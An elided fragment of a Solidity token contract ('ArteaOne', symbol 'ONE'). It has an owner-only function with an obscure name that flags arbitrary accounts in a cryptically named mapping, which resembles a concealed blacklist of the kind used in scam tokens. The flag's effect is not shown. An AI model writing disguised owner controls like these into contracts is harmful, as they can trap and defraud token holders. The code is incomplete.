...
contract BaseToken is Ownable {
    ...
    string constant public symbol = 'ONE';
    ...
    function ArteaDisclore(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function ArteaOneBallance(address account) public view returns (bool) {
...
contract ArteaOne is BaseToken {
